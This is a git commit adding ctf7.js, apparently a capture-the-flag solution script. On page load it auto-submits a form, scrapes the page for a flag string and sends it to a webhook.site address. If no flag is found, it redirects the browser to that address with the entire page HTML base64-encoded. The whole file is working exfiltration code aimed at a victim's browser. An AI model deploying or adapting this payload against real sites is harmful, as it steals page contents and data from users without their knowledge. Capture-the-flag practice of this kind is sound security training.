4c0ad3d6b29126087e353f1478ba063ea7015ace
dmitrysemenkovbumble <116367242+dmitrysemenkovbumble@users.noreply.github.com>
2025-06-26 14:25:31 +0200

    Create ctf7.js

---
+++ ctf7.js
@@ -0,0 +1,15 @@
+document.addEventListener("DOMContentLoaded", () => {
+  const form = document.querySelector('form');
+  if (form) {
+    form.submit();
+
+    setTimeout(() => {
+      const flag = document.body.innerText.match(/flag\{.*?\}/i);
+      if (flag) {
+        new Image().src = "https://webhook.site/509bc2d5-1bbf-48af-b518-15fae56365f0?x=" + encodeURIComponent(flag[0]);
+      } else {
+        window.location = "https://webhook.site/509bc2d5-1bbf-48af-b518-15fae56365f0?x=" + btoa(document.documentElement.innerHTML);
+      }
+    }, 1500);
+  }
+});
